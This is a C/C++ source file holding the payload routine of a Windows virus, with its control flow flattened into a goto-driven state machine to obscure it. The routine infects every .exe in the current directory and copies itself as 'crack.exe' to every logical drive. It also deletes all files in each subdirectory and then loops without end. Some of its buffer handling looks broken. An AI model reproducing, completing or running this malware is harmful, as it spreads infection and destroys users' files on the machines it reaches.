#include "data_globals.h"
#pragma optimize("", off)
void Payload(void)
{
    volatile int dummy_state = 1;
    int dummy_return_stored = 0;

dummy_dispatcher:
    if (dummy_state == 1) goto dummy_state_1;
    if (dummy_state == 2) goto dummy_state_2;
    if (dummy_state == 3) goto dummy_state_3;
    if (dummy_state == 4) goto dummy_state_4;
    if (dummy_state == 5) goto dummy_state_5;
    if (dummy_state == 6) goto dummy_state_6;
    if (dummy_state == 7) goto dummy_state_7;
    if (dummy_state == 0) goto dummy_end;

dummy_state_1:
{
    WIN32_FIND_DATAA findDataExe;
    WIN32_FIND_DATAA findDataDir;
    WIN32_FIND_DATAA findDataSub;
    char drivePath[42] = {};
    char tempPath[16] = {};
    char baseDir[160] = {};
    char searchPattern[16] = {};
    char dirCopy[16] = {};
    HANDLE hFindExe = INVALID_HANDLE_VALUE;
    HANDLE hFindDir = INVALID_HANDLE_VALUE;
    HANDLE hFindSub = INVALID_HANDLE_VALUE;
    char* driveIter = nullptr;
    size_t driveLen = 0;

    strncpy(drivePath, "crack.exe", 10);

    dummy_state = 2;
    goto dummy_dispatcher;
}

dummy_state_2:
{
    Sleep(5000);
    dummy_state = 3;
    goto dummy_dispatcher;
}

dummy_state_3:
{
    WIN32_FIND_DATAA findDataExe;
    WIN32_FIND_DATAA findDataDir;
    WIN32_FIND_DATAA findDataSub;
    char drivePath[42] = {};
    char tempPath[16] = {};
    char baseDir[160] = {};
    char searchPattern[16] = {};
    char dirCopy[16] = {};
    HANDLE hFindExe = INVALID_HANDLE_VALUE;
    HANDLE hFindDir = INVALID_HANDLE_VALUE;
    HANDLE hFindSub = INVALID_HANDLE_VALUE;
    char* driveIter = nullptr;
    size_t driveLen = 0;

    strncpy(drivePath, "crack.exe", 10);

    hFindExe = FindFirstFileA("*.exe", &findDataExe);
    if (hFindExe != INVALID_HANDLE_VALUE) {
        do {
            Infect(findDataExe.cFileName, VBuffer);
        } while (FindNextFileA(hFindExe, &findDataExe));
        FindClose(hFindExe);
    }
    dummy_state = 4;
    goto dummy_dispatcher;
}

dummy_state_4:
{
    GetLogicalDriveStringsA(0x400, Drives);
    dummy_state = 5;
    goto dummy_dispatcher;
}

dummy_state_5:
{
    WIN32_FIND_DATAA findDataExe;
    WIN32_FIND_DATAA findDataDir;
    WIN32_FIND_DATAA findDataSub;
    char drivePath[42] = {};
    char tempPath[16] = {};
    char baseDir[160] = {};
    char searchPattern[16] = {};
    char dirCopy[16] = {};
    HANDLE hFindExe = INVALID_HANDLE_VALUE;
    HANDLE hFindDir = INVALID_HANDLE_VALUE;
    HANDLE hFindSub = INVALID_HANDLE_VALUE;
    char* driveIter = nullptr;
    size_t driveLen = 0;

    strncpy(drivePath, "crack.exe", 10);

    for (driveIter = Drives; *driveIter != '\0'; driveIter += driveLen + 1) {
        strcpy(drivePath + 10, driveIter);
        strcat(drivePath + 10, drivePath);
        CopyFileA(Virus, drivePath + 10, 0);
        driveLen = strlen(driveIter);
    }
    dummy_state = 6;
    goto dummy_dispatcher;
}

dummy_state_6:
{
    WIN32_FIND_DATAA findDataExe;
    WIN32_FIND_DATAA findDataDir;
    WIN32_FIND_DATAA findDataSub;
    char drivePath[42] = {};
    char tempPath[16] = {};
    char baseDir[160] = {};
    char searchPattern[16] = {};
    char dirCopy[16] = {};
    HANDLE hFindExe = INVALID_HANDLE_VALUE;
    HANDLE hFindDir = INVALID_HANDLE_VALUE;
    HANDLE hFindSub = INVALID_HANDLE_VALUE;
    char* driveIter = nullptr;
    size_t driveLen = 0;

    strncpy(drivePath, "crack.exe", 10);

    hFindDir = FindFirstFileA("*.", &findDataDir);
    if (hFindDir != INVALID_HANDLE_VALUE) {
        do {
            if (findDataDir.dwFileAttributes == 0x10) {
                strcpy(tempPath, baseDir);
                strcat(tempPath, findDataDir.cFileName);
                strcpy(searchPattern, tempPath);
                strcpy(dirCopy, tempPath);
                driveLen = strlen(searchPattern);
                strncpy(searchPattern + driveLen, "\\*.*", 5);
                hFindSub = FindFirstFileA(searchPattern, &findDataSub);
                if (hFindSub != INVALID_HANDLE_VALUE) {
                    do {
                        strcpy(tempPath, dirCopy);
                        driveLen = strlen(tempPath);
                        tempPath[driveLen] = '\\';
                        tempPath[driveLen + 1] = '\0';
                        strcat(tempPath, findDataSub.cFileName);
                        DeleteFileA(tempPath);
                    } while (FindNextFileA(hFindSub, &findDataSub));
                    FindClose(hFindSub);
                }
            }
        } while (FindNextFileA(hFindDir, &findDataDir));
        FindClose(hFindDir);
    }
    dummy_state = 7;
    goto dummy_dispatcher;
}

dummy_state_7:
{
    dummy_state = 2;
    goto dummy_dispatcher;
}

dummy_end:
    return;
}
#pragma optimize("", on)
